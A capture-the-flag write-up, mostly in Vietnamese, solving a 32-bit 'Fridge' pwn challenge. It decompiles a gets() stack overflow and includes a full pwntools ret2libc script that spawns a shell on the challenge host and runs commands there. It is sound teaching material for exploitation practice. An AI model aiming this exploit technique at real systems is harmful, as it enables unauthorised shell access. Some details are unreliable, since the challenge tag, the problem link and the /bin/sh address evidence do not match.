---
title: "Fridge - 0xFUN CTF Write Up"
date: 2026-02-28
tags: [PascalCTF, pwn]
description: "My team's write up for 0xFUN contest"
---

> Problem link: https://ctf.0xfun.org/challenges#Chip8%20Emulator-70
> Category: Pwn
> Points: 100
> Level: Easy

## Challenge Description
We've experienced a data breach! Our forensics team detected unusual network activity originating from our new smart refrigerator. It turns out there's an old debugging service still running on it. Now it’s your job to figure out how the attackers gained access to the fridge!

## Overall
Đề cho một binary và một `(HOST, PORT)` để kết nối lấy flag thật. Thực hiện check qua binary:
```bash
$ file vuln
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=6fee5419f26fbcbac3ff79a35b94dc4cb908b71e, for GNU/Linux 3.2.0, not stripped

$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   51 Symbols        No    0               3               vuln
```

**Nhận xét:**
- Binary 32-bit, không có PIE → địa chỉ cố định
- Không có Stack Canary → có thể overflow mà không bị phát hiện
- NX enabled → không thể thực thi shellcode trên stackz

## Analyzing
Thực hiện decompile bằng IDA và sub lại, ta có flow của chương trình như sau:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Giả định các biến và đường dẫn từ phân vùng data của binary
const char* open_message = "Welcome to the Smart Fridge Manager!";
const char* options_message = "1. List food in fridge\n2. Set welcome message\n3. Exit";
const char* config_filepath = "./config.txt";

// --- [Raw function name: print_food] ---
// Hàm này liệt kê các tệp tin trong thư mục 'food_dir'
int print_food() {
    puts("Food currently in fridge:");
    // Sử dụng lệnh hệ thống ls để liệt kê file, cách nhau bởi dấu phẩy (-m)
    return system("ls -m food_dir");
}

// --- [Raw function name: set_welcome_message] ---
// Hàm này cho phép người dùng nhập tin nhắn mới và lưu vào file cấu hình
int set_welcome_message() {
    char s[32];      // Bộ đệm 32 byte [esp+Ch] [ebp-2Ch]
    FILE *stream;    // [esp+2Ch] [ebp-Ch]

    puts("New welcome message (up to 32 chars):");
    
    // LỖ HỔNG BẢO MẬT: Hàm gets() không kiểm tra độ dài đầu vào
    // Cho phép tấn công Stack Buffer Overflow
    gets(s); 

    stream = fopen(config_filepath, "w");
    if (!stream) {
        puts("Unable to open config file.");
        exit(1);
    }

    // Ghi tin nhắn mới vào file cấu hình
    fprintf(stream, "welcome_msg: %s", s);
    return fclose(stream);
}

// --- [Raw function name: main] ---
int main(int argc, const char **argv, const char **envp) {
    char choice;

    puts(open_message);

    while (1) {
        puts(options_message);
        printf("> ");
        fflush(stdout);

        choice = getchar();
        
        // Xóa bộ đệm cho đến khi gặp dòng mới (ASCII 10)
        while (getchar() != 10 && !feof(stdin));

        if (choice == '3') { // ASCII 51
            break;
        }

        if (choice > '3') {
            goto INVALID_OPTION;
        }

        if (choice == '1') { // ASCII 49
            print_food();
        }
        else if (choice == '2') { // ASCII 50
            set_welcome_message();
        }
        else {
        INVALID_OPTION:
            puts("Invalid option.");
        }
    }

    puts("Bye!");
    return 0;
}
```

- **Nhận xét**: Ta nhận thấy hàm `gets()` không giới hạn số byte đọc vào, do đó có thể ghi đè stack buffer và kiểm soát địa chỉ return.

Thực hiện kiểm tra các symbol trong binary:
```bash
$ nm vuln | grep -E "system|print_food"
080491e6 T print_food
         U system@GLIBC_2.0

$ strings -t x vuln | grep "/bin/sh"
   206d - Fixed issue that allowed bad actors to get /bin/sh
```
- Ta xác định địa chỉ chính xác của `/bin/sh` trong `.rodata`: `0x0804a09a`

## Exploit
Vì NX được bật, ta không thể thực thi shellcode trực tiếp. Vì vậy, ta sử dụng kỹ thuật **ret2libc** để gọi `system("/bin/sh")`.

### Tính toán offset
Thực hiện disassemble hàm `set_welcome_message`, ta có:
```bash
pwndbg> disassemble set_welcome_message
Dump of assembler code for function set_welcome_message:
   0x08049222 <+0>:     push   ebp
   0x08049223 <+1>:     mov    ebp,esp
   0x08049225 <+3>:     push   ebx
   0x08049226 <+4>:     sub    esp,0x34
   0x08049229 <+7>:     call   0x8049120 <__x86.get_pc_thunk.bx>
   0x0804922e <+12>:    add    ebx,0x2dc6
   0x08049234 <+18>:    sub    esp,0xc
   0x08049237 <+21>:    lea    eax,[ebx-0x1edc]
   0x0804923d <+27>:    push   eax
   0x0804923e <+28>:    call   0x8049090 <puts@plt>
   0x08049243 <+33>:    add    esp,0x10
   0x08049246 <+36>:    sub    esp,0xc
   0x08049249 <+39>:    lea    eax,[ebp-0x2c]
   0x0804924c <+42>:    push   eax
   0x0804924d <+43>:    call   0x8049060 <gets@plt>
   0x08049252 <+48>:    add    esp,0x10
   0x08049255 <+51>:    mov    eax,DWORD PTR [ebx+0x40]
   0x0804925b <+57>:    sub    esp,0x8
   0x0804925e <+60>:    lea    edx,[ebx-0x1eb6]
   0x08049264 <+66>:    push   edx
   0x08049265 <+67>:    push   eax
   0x08049266 <+68>:    call   0x80490d0 <fopen@plt>
   0x0804926b <+73>:    add    esp,0x10
   0x0804926e <+76>:    mov    DWORD PTR [ebp-0xc],eax
   0x08049271 <+79>:    cmp    DWORD PTR [ebp-0xc],0x0
   0x08049275 <+83>:    jne    0x8049293 <set_welcome_message+113>
   0x08049277 <+85>:    sub    esp,0xc
   0x0804927a <+88>:    lea    eax,[ebx-0x1eb4]
   0x08049280 <+94>:    push   eax
   0x08049281 <+95>:    call   0x8049090 <puts@plt>
   0x08049286 <+100>:   add    esp,0x10
   0x08049289 <+103>:   sub    esp,0xc
   0x0804928c <+106>:   push   0x1
   0x0804928e <+108>:   call   0x80490b0 <exit@plt>
   0x08049293 <+113>:   sub    esp,0x4
   0x08049296 <+116>:   lea    eax,[ebp-0x2c]
   0x08049299 <+119>:   push   eax
   0x0804929a <+120>:   lea    eax,[ebx-0x1e98]
   0x080492a0 <+126>:   push   eax
   0x080492a1 <+127>:   push   DWORD PTR [ebp-0xc]
   0x080492a4 <+130>:   call   0x80490c0 <fprintf@plt>
   0x080492a9 <+135>:   add    esp,0x10
   0x080492ac <+138>:   sub    esp,0xc
   0x080492af <+141>:   push   DWORD PTR [ebp-0xc]
   0x080492b2 <+144>:   call   0x8049080 <fclose@plt>
   0x080492b7 <+149>:   add    esp,0x10
   0x080492ba <+152>:   nop
   0x080492bb <+153>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x080492be <+156>:   leave
   0x080492bf <+157>:   ret
```

Từ disassembly của `set_welcome_message`:
- Buffer `s` nằm tại `[ebp-0x2C]` = 44 bytes từ EBP
- Cộng thêm 4 bytes (saved EBP) = **48 bytes** để đến địa chỉ return

Stack layout sau khi overflow
```
+------------------+
| padding (48 B)   |  ← Buffer + saved EBP
+------------------+
| system@plt       |  ← Return address → gọi system()
+------------------+
| 0x41414141       |  ← Fake return (sau khi system kết thúc)
+------------------+
| &"/bin/sh"       |  ← Tham số cho system()
+------------------+
```

### Exploit Script
```python
from pwn import *

context.log_level = 'debug'

# Remote target  
p = remote("chall.0xfun.org", 49574)

# Addresses
system_plt = 0x080490a0
binsh = 0x0804a09a

offset = 44 + 4

# ret2libc: system("/bin/sh")
payload = b'A' * offset
payload += p32(system_plt)
payload += p32(0x41414141)
payload += p32(binsh)

# Wait for menu and select option 2
p.recvuntil(b"> ")
p.sendline(b"2")

# Wait for prompt and send payload  
p.recvuntil(b":")
p.sendline(payload)

# Send commands to shell
p.sendline(b"id")
p.sendline(b"cat flag*")
p.sendline(b"ls -la")

# Receive all available data
try:
    print(p.recvall(timeout=5).decode())
except:
    print(p.recv(timeout=2))
```

Flag là `0xfun{4_ch1ll1ng_d1sc0v3ry!p1x3l_b3at_r3v3l4t1ons_c0d3x_b1n4ry_s0rcery_unl3@sh3d!}`